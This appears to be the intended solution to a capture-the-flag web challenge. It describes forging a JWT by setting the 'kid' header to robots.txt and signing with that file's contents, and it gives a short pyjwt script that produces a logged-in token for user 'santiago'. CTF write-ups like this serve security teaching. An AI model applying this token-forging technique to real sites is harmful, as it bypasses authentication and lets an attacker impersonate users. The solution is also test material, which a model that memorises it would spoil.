# Intended solution

1. Copy the JWT from your browser's cookies and observe that the header includes the field "kid"
2. Observe that you can access /robots.txt
3. Download robots.txt and use the following python script to generate a valid JWT 

*Note: the python script uses the package pyjwt*

```python
import jwt

payload_data = {
    'loggedin': True,
    'username': 'santiago'
}

header_data = {'kid': 'robots.txt'}

with open("robots.txt") as f:
	secret = f.read()
token = jwt.encode(headers=header_data, payload=payload_data, key=secret, algorithm='HS256')
print(token)
```

4. Paste the valid JWT in your browser
5. Refresh the page